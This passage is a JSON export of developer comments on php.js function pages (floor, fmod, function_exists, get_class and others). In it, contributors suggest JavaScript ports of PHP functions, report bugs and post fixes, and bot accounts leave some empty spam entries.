false;\r\n}\r\n\r\n\/\/In this case the error is still thrown AND the alert is called;\r\ntry{\r\n     throw new Error('error1');\r\n}catch(e){};\r\nalert(&quot;FOO&quot;);\r\n[\/CODE]\r\nI know I may not be clear on what I'm saying but I hope you see what I'm getting at."},{"date":"2008-12-10 17:33:31","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Arcanis &amp; T. Wild: Thanks for your input guys. T.Wild, I've implemented your suggestion and am curious what people will say about this approach. If the responses are good we might implement it in other cases as well."},{"date":"2010-10-07 19:16:40","author":"Dorian","url":"none","comment":"i have a problem for use this function on Internet Explorer, missing:\n\nObject doesn't support this property or method\n\nin this line: \n[CODE]if (!req.getResponseHeader)[\/CODE]\n\nbroken and not continue.\n\n\u00bfwhat is the solution for this problem?\n"},{"date":"2011-08-26 09:49:35","author":"Prast","url":"http:\/\/f-code.web.id","comment":"how about error in internet explorer as Dorian mentioned before? "}],"floor":[{"date":"2010-09-05 16:37:25","author":"Mogria","url":"","comment":"I think this function is unnecessary.\nWhy you don't use \"Math.floor\" ..."},{"date":"2010-09-06 12:44:33","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Mogria: You can and probably should just use Math.floor. We are trying to fully implement the PHP API, both for the sake of convenience of those familiar with PHP and moving to JavaScript, and for the sake of (usually) offering convenient features that do not always map one-to-one to a built-in JavaScript function as this one does."},{"date":"2010-09-08 19:48:24","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Mogria: This can also be used as a learning reference for PHP folks trying to learn JavaScript. Besides this opens up all kinds of opportunities like the Harmony Framework"},{"date":"2010-12-09 02:08:16","author":"Andrew","url":"","comment":"Why don't you just have\n[CODE]\nfloor = Math.floor;\n[\/CODE]\nHas the same functionality and it's marginally faster in all browsers too, since it bypasses the encumbered 'Math' object."},{"date":"2010-12-09 04:31:21","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Andrew: Yes, that works well, but 1) We're following the same functional format for the sake of familiarity to our users (and possibly also simplicity in our compiler). 2) All our functions can be used not only in a non-namespaced environment, but also in a namespaced one (which I know could be done by \"floor: Math.floor\" if the compiler were aware of this format). Granted, in that case, one may just as well use Math.floor directly, but as we describe somewhere in our FAQ or site, some functions are implemented just for the sake of students of JavaScript (coming from PHP backgrounds) or for those still just functioning as script kiddies who are rushing to put something together that works, and who haven't taken time yet to learn the details of the language they will hopefully eventually learn more deeply. That being said, the large majority of functions in php.js are not and cannot be mere wrappers for the limited utility set built into JavaScript since PHP is far more expressive as far as built-in utilities."},{"date":"2011-02-17 15:58:23","author":"ejrdtykufg","url":"","comment":"Please add author's portrait to this function!"},{"date":"2011-02-18 04:25:05","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@ejrdtykufg: Good joke, but if you weren't aware of the site's purpose, read the comments below yours."},{"date":"2011-06-30 15:36:32","author":"dude","url":"","comment":"again... DO IT RIGHT!!!\nreturn value|value"},{"date":"2011-06-30 16:33:32","author":"Rafa? Kukawski","url":"","comment":"@dude: Math.floor(value) !== value|value\nfloor(-10.5) === -11\n(-10.5|-10.5) === -10\nYour approach is only valid for positive numbers."},{"date":"2012-04-18 10:19:11","author":"????? ?????? ? ?????","url":"http:\/\/an3m1.com\/","comment":"I wonder how you got so good. HaHa ! This is really a fascinating blog, lots of stuff that I can get into. One thing I just want to say is that your design is so perfect ! You certainly know how to get a girls attention ! I\u2019m glad that you\u2019re here. I feel like I\u2019ve learned something new by being here   \n"}],"fmod":[{"date":"2008-10-01 13:52:45","author":"Enrique Gonz\u00e1lez","url":"http:\/\/www.maciaspajas.com","comment":"Two simple functions that translate deg to rad and viceversa:\r\n\r\n[CODE=&quot;javascript&quot;]\r\nfunction deg2rad(angle)\r\n  {\r\n  \/\/*        example 1 : deg2rad (180)\r\n  \/\/*        returns 1 : 3.141592653589793\r\n  return (angle\/180)*Math.PI;\r\n  }\r\n  \r\nfunction rad2deg(angle)\r\n  {\r\n  \/\/*        example 1 : deg2rad (pi())   \r\n  \/\/*        returns 1 : 3.141592653589793\r\n  return (angle\/Math.PI)*180;\r\n  }\r\n[\/CODE]"},{"date":"2008-10-01 14:24:56","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Enrique Gonz\u00c3\u00a1lez: Thank you so much!"},{"date":"2008-10-01 15:00:56","author":"Enrique Gonz\u00e1lez","url":"http:\/\/www.maciaspajas.com","comment":"The example 1 at rad2deg is wrong. It should be something like:\r\n\r\nrad2deg (3.141592653589793)\r\nreturns 180"},{"date":"2008-10-01 15:18:10","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Enrique Gonz\u00c3\u00a1lez: Whoops, my bad."},{"date":"2008-10-05 17:50:26","author":"Onno Marsman","url":"","comment":"The following comments should be removed, they are not true:\r\n\r\n\/\/ %          note: Examples in PHP &amp; JS return: 0.8, but according \r\n    \/\/ %          note: the PHP-manual's it should be 0.5. PHP manual seems to be incorrect?"},{"date":"2008-10-06 12:25:55","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Onno Marsman: Sharp, thanks again Onno."},{"date":"2011-03-09 08:42:04","author":"Kutsy","url":"","comment":"[CODE]\nphp: fmod(5,10) => 5\njs: fmod(5,10) => 10  !!! Must be \"5\"!\n[\/CODE]\n"},{"date":"2012-02-08 21:38:57","author":"Lord_t","url":"hrabstwo.net","comment":"It doesn't work!"},{"date":"2012-02-08 22:14:48","author":"lord_t","url":"hrabstwo.net","comment":"[CODE]\nMath.fmod = function(x, y) {\n    \/\/ Returns the remainder of dividing x by y as a float  \n    \/\/ \n    \/\/ version: 1109.2015\n    \/\/ discuss at: http:\/\/phpjs.org\/functions\/fmod    \/\/ +   original by: Onno Marsman\n    \/\/ +      input by: Brett Zamir (http:\/\/brett-zamir.me)\n    \/\/ +   bugfixed by: Kevin van Zonneveld (http:\/\/kevin.vanzonneveld.net)\n\/\/ +   bugfixed by: Pawel 'lord_t' Maruszczyk \n    \/\/ *     example 1: fmod(5.7, 1.3);\n    \/\/ *     returns 1: 0.5    \n    var tmp, tmp2, p = 0,\n        pY = 0,\n        l = 0.0,\n        l2 = 0.0;\n     tmp = x.toExponential().match(\/^.\\.?(.*)e(.+)$\/);\n    p = parseInt(tmp[2], 10) - (tmp[1] + '').length;\n    tmp = y.toExponential().match(\/^.\\.?(.*)e(.+)$\/);\n    pY = parseInt(tmp[2], 10) - (tmp[1] + '').length;\n     if (pY > p) {\n        p = pY;\n    }\n \n    tmp2 = (x % y); \n    if (p < -100 || p > 20) {\n        \/\/ toFixed will give an out of bound error so we fix it like this:\n        l = Math.round(Math.log(tmp2) \/ Math.log(10));\n        l2 = Math.pow(10, l); \n        return (tmp2 \/ l2).toFixed(l - p) * l2;\n    } else {\n        return tmp2;\n    }\n}\n[\/CODE]"},{"date":"2012-02-08 22:16:42","author":"lord_t","url":"http:\/\/hrabstwo.net","comment":"[CODE]\nMath.fmod = function(x, y) {\n    \/\/ Returns the remainder of dividing x by y as a float  \n    \/\/ \n    \/\/ version: 1109.2015\n    \/\/ discuss at: http:\/\/phpjs.org\/functions\/fmod    \/\/ +   original by: Onno Marsman\n    \/\/ +      input by: Brett Zamir (http:\/\/brett-zamir.me)\n    \/\/ +   bugfixed by: Kevin van Zonneveld (http:\/\/kevin.vanzonneveld.net)\n\/\/ +   bugfixed by: Pawel 'lord_t' Maruszczyk (http:\/\/hrabstwo.net)\n    \/\/ *     example 1: fmod(5.7, 1.3);\n    \/\/ *     returns 1: 0.5    \n    var tmp, tmp2, p = 0,\n        pY = 0,\n        l = 0.0,\n        l2 = 0.0;\n     tmp = x.toExponential().match(\/^.\\.?(.*)e(.+)$\/);\n    p = parseInt(tmp[2], 10) - (tmp[1] + '').length;\n    tmp = y.toExponential().match(\/^.\\.?(.*)e(.+)$\/);\n    pY = parseInt(tmp[2], 10) - (tmp[1] + '').length;\n     if (pY > p) {\n        p = pY;\n    }\n \n    tmp2 = (x % y); \n    if (p < -100 || p > 20) {\n        \/\/ toFixed will give an out of bound error so we fix it like this:\n        l = Math.round(Math.log(tmp2) \/ Math.log(10));\n        l2 = Math.pow(10, l); \n        return (tmp2 \/ l2).toFixed(l - p) * l2;\n    } else {\n        return tmp2;\n    }\n}\n[\/CODE]"},{"date":"2012-03-06 12:32:42","author":"kirilloid","url":"","comment":"Hm-hm. Why not use this?\n[code]function fmod (x, y) {\n    return  x % y;\n}[\/code]"}],"function_exists":[{"date":"2008-01-04 04:54:15","author":"Steve Clay","url":"","comment":"return (typeof window[function_name] == 'function');"},{"date":"2008-01-04 09:30:09","author":"Andrey","url":"","comment":"&gt;return (typeof window[function_name] == 'function');\r\n\r\nObject-function may be defined as not a member of Window object."},{"date":"2008-01-04 13:49:34","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Steve Clay &amp; Andrey: Thanks You guys I've updated the function. I left the old code in the comments for future reference."},{"date":"2008-01-06 03:54:43","author":"Cord","url":"","comment":"&gt;&gt;function is_array() {\r\nshould be\r\n&gt;&gt;function is_array(a) {"},{"date":"2008-01-06 13:00:45","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Cord: Thanks for noticing. Fixed!"},{"date":"2008-01-07 15:19:44","author":"Legaev Andrey (aka Andrey)","url":"","comment":"Sorry for my short previous comment and my bad English. Below full version.\r\n\r\nIf we pass function_name as String then all ok. But if we pass the link to function (link to Object-function) then\r\nthis function returns false. In my opinion in this case this function should return true when first \r\nparameter is instance of Function.\r\n\r\nfunction function_exists_new( function_name ) {\r\n\tif (typeof function_name == \\'string\\')\r\n\t    return (typeof window[function_name] == \\'function\\');\r\n\telse\r\n\t\treturn (function_name instanceof Function);\r\n}\r\n\r\nP.S. Please, change my name to Legaev Andrey &lt;legaev_andrey@mail.ru&gt;. Thanks."},{"date":"2008-01-07 15:44:28","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Legaev Andrey: Hi, I've updated the function and changed your name. I wasn't sure you really want me to enlist your email address?"},{"date":"2008-01-08 11:10:45","author":"Legaev Andrey","url":"","comment":"@ Kevin: I'm sorry. Not necessary to enlist my email. I did not think about spammers :)"},{"date":"2008-01-14 23:02:35","author":"Andrea Giammarchi","url":"","comment":"If you are interested in some similar stuff, looks for JHP setting in overbyte editor.\r\n\r\nFinally, You could use my define function too, that accept only scalar values as PHP and is compatible with IE, FireFox, Safari and Opera (Opera devs will fix soon their const keyword ... I guess ...)\r\n\r\nhttp:\/\/webreflection.blogspot.com\/2007\/10\/cow-javascript-define-php-like-function.html\r\n\r\nHowever, nice stuff .. not so useful in my mind because of different languages nature (I would like to have JS behaviours in PHP, for example :D) but good luck for the project"},{"date":"2008-01-15 08:29:19","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Andrea Giammarchi: Wow you did some impressive work that I was unaware of. Cool :) I will look into the define function later today and add it here, thanks a lot for that.\r\n\r\nAbout the PHP vs JS stuff.. I'm not trying to port or emulate the entire language or control structures of PHP. Indeed I don't see the need because (and this is quite a statement), Javascript seems to have more elegant features in that category anyway.\r\n\r\nHowever in my eyes, PHP does provide a large set of standard functions that make developing very easy, and some of them don't have good standard Javascript implementations, though they often would be great to have client-side. \r\n\r\nSo in this project by also providing the functions separately, I hope to keep people from inventing the wheel and give them a head start.\r\n\r\nThanks for your comment Andrea, well appreciated. And respect for your Overbyte editor &amp; JHP environment. The idea is very interesting, and I can see it's all coded with very high skill."},{"date":"2008-12-17 05:12:14","author":"Brett Zamir","url":"","comment":"Here's one more...\r\n\r\n[CODE=&quot;Javascript&quot;] \r\nfunction get_defined_functions() {\r\n    var arr = [];\r\n    for (var i in window) {\r\n        try {\r\n            if (typeof window[i] === 'function') {\r\n                arr.push(window[i].name);\r\n            }\r\n        }\r\n        catch (e) {\r\n        }\r\n    }\r\n    return arr;\r\n}\r\nalert(get_defined_functions());[\/CODE]"},{"date":"2008-12-17 14:34:07","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Brett Zamir: get_defined_functions... I must say, sometimes I'm really surprised what you guys come up with :) But it works! I have even hacked a testcase around it. Thanks again."},{"date":"2008-12-20 11:59:33","author":"Brett Zamir","url":"","comment":"Here's another one more related to the function here...\r\n\r\nSample based on PHP manual...\r\n\r\n[CODE=&quot;Javascript&quot;]function Directory () {}\r\nDirectory.prototype.read = function () {}\r\n$directory = new Directory('.');\r\nalert(true === method_exists($directory,'read')); \/\/ true\r\nalert(true === method_exists($directory,'write')); \/\/ false\r\n[\/CODE]\r\n\r\n\r\n[CODE=&quot;Javascript&quot;]function method_exists (obj, method) {\r\n    return typeof obj[method] === 'function';\r\n}[\/CODE]"},{"date":"2008-12-20 12:05:37","author":"Brett Zamir","url":"","comment":"Sorry, neglected to see a string was allowable to test for a static method:\r\n[CODE=&quot;Javascript&quot;]\r\n\r\nfunction Directory () {}\r\nDirectory.test = function () {}\r\nDirectory.prototype.read = function () {}\r\n$directory = new Directory('.');\r\nalert(true === method_exists($directory,'read')); \/\/ true\r\nalert(true === method_exists($directory,'write')); \/\/ false\r\nalert(true === method_exists('Directory','test')); \/\/ true\r\n[\/CODE]\r\n\r\n[CODE=&quot;Javascript&quot;]function method_exists (obj, method) {\r\n    if (typeof obj === 'string') {\r\n        return typeof window[obj][method] === 'function'\r\n    }\r\n    return typeof obj[method] === 'function';\r\n}[\/CODE]"},{"date":"2008-12-23 04:52:59","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"Fixing an error and adding more examples:\r\n\r\n[CODE=&quot;Javascript&quot;]function Directory () {}\r\nDirectory.test = function () {}\r\nDirectory.prototype.read = function () {}\r\n$directory = new Directory('.');\r\nalert(true === method_exists($directory,'read')); \/\/ true\r\nalert(true === method_exists($directory,'write')); \/\/ false\r\nalert(true === method_exists('Directory','test')); \/\/ true\r\nalert(true === method_exists('Directory','read')); \/\/ false\r\nalert(true === method_exists($directory,'test')); \/\/ false\r\n\r\nfunction method_exists (obj, method) {\r\n    if (typeof obj === 'string') {\r\n        return window[obj] &amp;&amp; typeof window[obj][method] === 'function'\r\n    }\r\n    return typeof obj[method] === 'function';\r\n}\r\n[\/CODE]"},{"date":"2008-12-23 05:43:27","author":"Brett Zamir","url":"","comment":"Here's a slightly hackish and partially non-standard way to get class_exists(). Of course, any function can be instantiated in JavaScript, but I've attempted to do a hopefully more sophisticated checking to see whether it was designed as one.\r\n\r\n[CODE=&quot;Javascript&quot;]\r\nfunction A (z) {this.z=z}\r\nalert(class_exists('A')); \/\/ true (constructor sets 'this')\r\nvar a = new A('str');\r\nalert(class_exists('a')); \/\/ false (objects not classes)\r\n\r\nfunction B () {}\r\nB.c = function () {}; \/\/ Add a static method, making it a class\r\nalert(class_exists('B')); \/\/ true\r\n\r\nfunction C () {}\r\nC.prototype.z = function () {};\r\nalert(class_exists('C')); \/\/ true\r\n\r\nfunction D (b) {}\r\nalert(class_exists('D')); \/\/ false (seems like a regular function)\r\n\r\nvar e = {\r\n    E : function (z) {this.z=z;}\r\n}\r\nalert(class_exists('e.E')); \/\/ false (the 'this' refers to containing object, not to an instance property)\r\n\r\n\r\nfunction class_exists (cls) {\r\n    cls = window[cls]; \/\/ Note: will prevent inner classes\r\n    if (typeof cls !== 'function') {return false;}\r\n    for (var i in cls.prototype) {\r\n        return true;\r\n    }\r\n    for (var i in cls) { \/\/ If static members exist, then consider a &quot;class&quot;\r\n        if (i !== 'prototype') {\r\n            return true;\r\n        }\r\n    }\r\n    if (cls.toSource &amp;&amp; cls.toSource().match(\/this\\.\/)) { \/\/ Hackish and non-standard but can probably detect if setting a property (we don't want to test by instantiating as that may have side-effects)\r\n        return true;\r\n    }\r\n    return false;\r\n}[\/CODE]"},{"date":"2008-12-23 06:24:45","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"And here's one for property_exists(), based on PHP doc examples:\r\n\r\n[CODE=&quot;Javascript&quot;]var myClass = {\r\n    mine : {},\r\n    xpto : {},\r\n    test : function () {\r\n        var_dump(property_exists('myClass', 'xpto')); \/\/ true\r\n    }\r\n}\r\nvar_dump(property_exists('myClass', 'mine'));   \/\/true\r\nvar_dump(property_exists('myClass', 'xpto'));   \/\/true\r\nvar_dump(property_exists('myClass', 'bar'));    \/\/false\r\nvar_dump(property_exists('myClass', 'test'));   \/\/ false (PHP considers methods as distinct from properties)\r\nmyClass.test(); \/\/ true\r\n\r\n\r\nfunction myClass2 () {\r\n    this.xpto = 'something';\r\n}\r\nmyClass2.staticProp = 'staticValue';\r\nmyClass2.staticMethod = function () {\r\n        var_dump(property_exists('myClass2', 'xpto')); \/\/ true\r\n}\r\nmyClass2.prototype.instanceMethod = function () {}\r\nmyClass2.prototype.mine = 'my member';\r\n\r\nvar_dump(property_exists('myClass2', 'mine'));   \/\/true\r\nvar_dump(property_exists(new myClass2, 'mine')); \/\/true\r\nvar_dump(property_exists('myClass2', 'xpto'));   \/\/true, as of PHP 5.3.0\r\nvar_dump(property_exists('myClass2', 'bar'));    \/\/false\r\nvar_dump(property_exists('myClass2', 'staticProp'));   \/\/true, as of PHP 5.3.0\r\nvar_dump(property_exists('myClass2', 'staticMethod'));    \/\/false\r\nvar_dump(property_exists('myClass2', 'instanceMethod'));    \/\/false\r\nmyClass2.staticMethod(); \/\/ true\r\n\r\n\r\nfunction property_exists (cls, prop) {\r\n    cls = (typeof cls === 'string') ? window[cls] : cls;\r\n    if (typeof cls === 'function' &amp;&amp; cls.toSource &amp;&amp; cls.toSource().match(new RegExp('this\\\\.'+prop+'\\\\s'))) { \/\/ Hackish and non-standard but can probably detect if setting the property (we don't want to test by instantiating as that may have side-effects)\r\n        return true;\r\n    }\r\n    return (cls[prop] !== undefined &amp;&amp; typeof cls[prop] !== 'function') || (cls.prototype !== undefined &amp;&amp; cls.prototype[prop] !== undefined &amp;&amp; typeof cls.prototype[prop] !== 'function');\r\n}\r\n[\/CODE]"},{"date":"2008-12-23 06:42:29","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"Added one last condition which will find if there is a static members on the class to which an object belongs, as well as some example tests for it as well:\r\n\r\n[CODE=&quot;Javascript&quot;]myClass2.prototype.instanceMethod = function () {}\r\nmyClass2.prototype.mine = 'my member';\r\nvar_dump(property_exists(new myClass2, 'mine')); \/\/true\r\nvar_dump(property_exists(new myClass2, 'xpto'));   \/\/true, as of PHP 5.3.0\r\nvar_dump(property_exists(new myClass2, 'bar'));    \/\/false\r\nvar_dump(property_exists(new myClass2, 'staticProp'));   \/\/true, as of PHP 5.3.0\r\nvar_dump(property_exists(new myClass2, 'staticMethod'));    \/\/false\r\nvar_dump(property_exists(new myClass2, 'instanceMethod'));    \/\/false\r\nvar myclass2 = new myClass2();\r\nmyclass2.staticMethod(); \/\/ doesn't exist\r\n[\/CODE]\r\n\r\n[CODE=&quot;Javascript&quot;]function property_exists (cls, prop) {\r\n    cls = (typeof cls === 'string') ? window[cls] : cls;\r\n    if (typeof cls === 'function' &amp;&amp; cls.toSource &amp;&amp; cls.toSource().match(new RegExp('this\\\\.'+prop+'\\\\s'))) { \/\/ Hackish and non-standard but can probably detect if setting the property (we don't want to test by instantiating as that may have side-effects)\r\n        return true;\r\n    }\r\n    return (cls[prop] !== undefined &amp;&amp; typeof cls[prop] !== 'function') || (cls.prototype !== undefined &amp;&amp; cls.prototype[prop] !== undefined &amp;&amp; typeof cls.prototype[prop] !== 'function') || cls.constructor &amp;&amp; cls.constructor[prop] !== undefined &amp;&amp; typeof cls.constructor[prop] !== 'function';\r\n}[\/CODE]"},{"date":"2008-12-30 11:24:24","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Brett Zamir: Thanks Brett. I've added the functions. I do have the idea they could be standardized &amp; improved a bit though, but I'll leave that up to the 'future us' :) Let those guys handle it. \r\n\r\nSeriously though: I think the class_exists example I've made should return true, but it doesn't. That's a good one to start with."},{"date":"2011-06-10 04:22:23","author":"noptets","url":"","comment":""},{"date":"2011-06-12 23:05:14","author":"Impatty","url":"","comment":""},{"date":"2011-06-17 09:05:59","author":"pleabok","url":"","comment":""},{"date":"2011-06-20 04:17:27","author":"Soivory","url":"","comment":""},{"date":"2011-08-01 14:32:44","author":"Plefand","url":"","comment":""},{"date":"2011-08-05 22:44:40","author":"Bug in function_exists","url":"","comment":"Hi guys\n\nFirstly thanks for a great little script!\nI am a php programmer and having phpjs is great!\n\nI downloaded the latest version of phpjf and found a bug with the function_exists() function.\n\nWhen it is compiled the function definition looks like this \n[CODE]\nfunction_exists: function (_name: function) {\n[\/CODE]\nwhich causes an error.\n\nI don't think its an actual bug in the code, its just in the compilation of the package :)\n\nThanks again guys\nHave a great day"},{"date":"2011-08-06 16:20:50","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"I assume the compiler might be looking for the text \"function_name\", so I changed that variable name in the function as a workaround. See if that works..."},{"date":"2011-09-09 03:09:13","author":"entaila1987","url":"","comment":""},{"date":"2011-09-09 03:55:46","author":"pourrex1981","url":"","comment":""},{"date":"2011-09-09 04:43:32","author":"Agreern1991","url":"","comment":""},{"date":"2011-09-09 05:30:09","author":"niduame1990","url":"","comment":""},{"date":"2011-09-09 06:15:51","author":"soonync1982","url":"","comment":""},{"date":"2011-09-09 07:02:12","author":"greaste1980","url":"","comment":""},{"date":"2011-09-09 07:48:39","author":"zolkivy1992","url":"","comment":""},{"date":"2011-09-09 08:33:36","author":"Merfits1982","url":"","comment":""},{"date":"2011-09-09 15:16:21","author":"entaila1987","url":"","comment":""},{"date":"2011-09-09 15:50:30","author":"pourrex1981","url":"","comment":""},{"date":"2011-09-09 16:26:24","author":"Agreern1991","url":"","comment":""},{"date":"2011-09-09 17:04:38","author":"niduame1990","url":"","comment":""},{"date":"2011-09-09 17:47:59","author":"soonync1982","url":"","comment":""},{"date":"2011-09-09 18:49:04","author":"zolkivy1992","url":"","comment":""},{"date":"2011-09-09 19:26:12","author":"Merfits1982","url":"","comment":""},{"date":"2011-09-10 00:25:58","author":"Otherne1981","url":"","comment":""},{"date":"2011-09-10 01:10:50","author":"Otherne1981","url":"","comment":""},{"date":"2011-09-10 19:24:50","author":"entaila1987","url":"http:\/\/bioty.mayka-tuta.ru\r\n","comment":""},{"date":"2011-09-10 20:05:45","author":"pourrex1981","url":"http:\/\/bioty.mayka-tuta.ru\r\n","comment":""},{"date":"2011-09-10 20:46:24","author":"Agreern1991","url":"http:\/\/bioty.mayka-tuta.ru\r\n","comment":""},{"date":"2011-09-10 21:29:04","author":"niduame1990","url":"http:\/\/bioty.mayka-tuta.ru\r\n","comment":""},{"date":"2011-09-10 22:08:07","author":"soonync1982","url":"http:\/\/bioty.mayka-tuta.ru\r\n","comment":""},{"date":"2011-09-10 22:50:28","author":"greaste1980","url":"http:\/\/bioty.mayka-tuta.ru\r\n","comment":""},{"date":"2011-09-10 23:38:53","author":"greaste1980","url":"http:\/\/bioty.mayka-tuta.ru\r\n","comment":""},{"date":"2011-09-11 00:22:27","author":"Merfits1982","url":"http:\/\/bioty.mayka-tuta.ru\r\n","comment":""},{"date":"2011-09-11 01:05:09","author":"Otherne1981","url":"http:\/\/bioty.mayka-tuta.ru\r\n","comment":""},{"date":"2011-09-11 03:33:51","author":"entaila1987","url":"http:\/\/schaldot.mayka-tuta.ru","comment":""},{"date":"2011-09-11 04:11:23","author":"pourrex1981","url":"http:\/\/decar.mayka-tuta.ru","comment":""},{"date":"2011-09-11 04:46:07","author":"Agreern1991","url":"http:\/\/reli.mayka-tuta.ru","comment":""},{"date":"2011-09-11 05:20:56","author":"niduame1990","url":"http:\/\/scholel.mayka-tuta.ru","comment":""},{"date":"2011-09-11 05:55:40","author":"soonync1982","url":"http:\/\/forto.mayka-tuta.ru","comment":""},{"date":"2011-09-11 06:29:54","author":"greaste1980","url":"http:\/\/starim.mayka-tuta.ru","comment":""},{"date":"2011-09-11 07:05:17","author":"zolkivy1992","url":"http:\/\/reli.mayka-tuta.ru","comment":""},{"date":"2011-09-11 07:41:15","author":"Merfits1982","url":"http:\/\/wietio.mayka-tuta.ru","comment":""},{"date":"2011-09-11 11:05:55","author":"Otherne1981","url":"http:\/\/starim.mayka-tuta.ru","comment":""},{"date":"2011-11-09 08:41:36","author":"Arignmor","url":"","comment":""},{"date":"2012-03-28 07:37:35","author":"originalll","url":"","comment":""},{"date":"2012-06-16 21:29:42","author":"Guergenug","url":"http:\/\/sovet4ik.info\/","comment":""},{"date":"2012-06-21 00:27:39","author":"kneesspal","url":"","comment":""}],"get_class":[{"date":"2008-02-15 23:40:12","author":"David James","url":"","comment":"for get_class() I suggest adding the i flag to the regex to accomodate Function as well as function\r\n\r\nBTW, i have convinced our lead programmer to adopt php.js as a standard library (and he's pretty picky)... great work!"},{"date":"2008-02-16 13:47:36","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ David James: That's very nice to hear, and thank you for your contribution!"},{"date":"2011-07-06 00:06:21","author":"uhhhh","url":"","comment":"this is a virus"},{"date":"2011-07-16 20:30:01","author":"","url":"","comment":""}],"get_defined_functions":[{"date":"2008-12-21 03:30:10","author":"Brett Zamir","url":"","comment":"Here's a slight improvement...For some reason, in Mozilla at least, you actually have to iterate over the window properties which are objects to get a few other globals not returned by a mere iteration of window itself (in Mozilla, these are: QueryInterface, addEventListener, getComputedStyle).\r\n\r\n[CODE=&quot;Javascript&quot;]function get_defined_functions() {\r\n    \/\/ http:\/\/kevin.vanzonneveld.net\r\n    \/\/ +   original by: Brett Zamir\r\n    \/\/ %        note 1: Test case 1: If get_defined_functions can find itself in the defined functions, it worked :)\r\n    \/\/ *     example 1: function test_in_array(array, p_val) {for(var i = 0, l = array.length; i &lt; l; i++) {if(array[i] == p_val) return true;} return false;}\r\n    \/\/ *     example 1: funcs = get_defined_functions();\r\n    \/\/ *     example 1: found = test_in_array(funcs, 'get_defined_functions');\r\n    \/\/ *     results 1: found == true\r\n \r\n    var i = '', arr = [], already = {};\r\n\r\n    for (i in window) {\r\n        try {\r\n            if (typeof window[i] === 'function') {\r\n                if (!already[i]) {\r\n                    already[i] = 1;\r\n                    arr.push(i);\r\n                }\r\n            }\r\n            else if (typeof window[i] === 'object') {\r\n                for (var j in window[i]) {\r\n                    if (typeof window[j] === 'function' &amp;&amp; window[j] &amp;&amp; !already[j]) {\r\n                        already[j] = 1;\r\n                        arr.push(j);\r\n                    }\r\n                }\r\n            }\r\n        }\r\n        catch (e) {\r\n \r\n        }\r\n    }\r\n \r\n    return arr;\r\n}\r\n[\/CODE]"},{"date":"2008-12-21 06:40:17","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"And here's get_defined_vars(). As far as iterating deeper over its object properties to get a few other globals, the function turns up 'document' and 'location' which would not otherwise be present.\r\n\r\n[CODE=&quot;Javascript&quot;]\r\nfunction get_defined_vars() {\r\n \r\n\tvar i = '', ct = 0, obj = {};\r\n \r\n\tfor (i in window) {\r\n\t\ttry {\r\n\t\t\t\/\/ if (typeof window[i] !== 'function') { \/\/ Uncomment if wish to ignore functions (though in JavaScript, they really are variables) \/\/ sessionStorage gives errors here in Mozilla\r\n\t\t\tobj[i] = window[i];\r\n\t\t\tif (typeof window[i] === 'object') {\r\n\t\t\t\tfor (var j in window[i]) { \/\/ 'history', 'globalStorage' gives errors here in Mozilla\r\n\t\t\t\t\tif (window[j] !== undefined) { \/\/ window\/parent\/top\/frames\/self give errors here in Mozilla\r\n\t\t\t\t\t\t\/\/ if (typeof window[j] !== 'function') { \/\/ Uncomment if wish to ignore functions (though in JavaScript, they really are variables)\r\n \t\t\t\t\t\tobj[j] = window[j];\r\n\t\t\t\t\t\t\/\/ }\r\n\t\t\t\t\t}\r\n\t\t\t\t}\r\n\t\t\t    }\r\n\t\t    \/\/ }\r\n\t\t}\r\n\t\tcatch (e) {\r\n\t\t}\r\n\t\tct++;\r\n\t}\t\r\n\t\/\/ window.length = ct; \/\/ Uncomment if wish to create an array-like object\r\n\treturn obj;\r\n}[\/CODE]"},{"date":"2008-12-30 12:36:56","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Brett Zamir: Awesome!"},{"date":"2012-04-10 09:56:27","author":"???? ????????","url":"http:\/\/an3m1.com\/","comment":"If I might \u2014perhaps you should consider adding a few images. I don\u2019t mean to disrespect what you\u2019ve said ; its very enlightening, indeed. However, I think would respond to it more positively if they could be something tangible to your ideas "}],"get_headers":[{"date":"2008-12-03 11:34:51","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Paulo Ricardo F. Santos: In my test suite: phpjstest.php, readyState would stay at 1, I had to build a condition &lt; 3 to avoid the function from crashing. Very strange, because the file_exists function uses the same code and that works ok."},{"date":"2008-12-03 12:56:47","author":"Paulo Ricardo F. Santos","url":"","comment":"@ Kevin: Hmm, great idea, I forgot this possible abnormal behavior! &gt;.&lt;\r\n\r\nAh!, man, I don't understood your example. Why it should returns 123? o.O"},{"date":"2008-12-03 12:58:34","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Paulo Ricardo F. Santos: Well I haven't got it working yet, so that's why the examples are still in a copy-pasted state."},{"date":"2008-12-03 13:26:51","author":"Paulo Ricardo F. Santos","url":"","comment":"@ Kevin: Ah! Well... how you are testing? AFAIK, there's no way to test it locally or request a cross-domain address. I've tested it on my test domain, requesting a file from same server. ;)"},{"date":"2008-12-03 14:14:46","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Paulo Ricardo F. 